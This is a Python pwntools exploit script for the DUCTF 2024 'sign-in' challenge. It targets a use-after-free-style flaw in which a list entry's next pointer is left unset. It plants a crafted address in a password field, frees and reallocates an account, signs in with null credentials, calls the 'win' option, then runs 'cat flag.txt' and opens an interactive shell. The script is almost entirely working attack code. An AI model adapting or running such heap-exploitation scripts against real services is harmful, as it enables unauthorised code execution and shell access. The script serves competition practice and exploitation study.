#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or 'sign-in', checksec=True)
# libc = exe.libc
# context.terminal = ["terminator", "-u", "-e"]
context.terminal = ["remotinator", "vsplit", "-x"]

gdbscript = '''
# tbreak main
continue
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or '2024.ductf.dev'
    port = int(args.PORT or 30022)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
def protect_ptr(pos, ptr): return (pos >> 12) ^ ptr


def sign_up(u,p):
    sla(b'> ', b'1')
    sa(b'username', u)
    sa(b'password', p)
    return u,p

def sign_in(u,p):
    sla(b'> ', b'2')
    sa(b'username', u)
    sa(b'password', p)


def remove_acc():
    sla(b'> ', b'3')


def win():
    sla(b'> ', b'4')


def new_acc():
    u = cyclic(8)
    p = cyclic(8)
    sign_up(u,p)
    return u,p


sign_in(*sign_up(cyclic(8), p64(0x402eb8)))
remove_acc()
new_acc()

sign_in(p64(0), p64(0))

win()
sl(b'cat flag.txt')


ia()


# entry->next is not set in sign_up
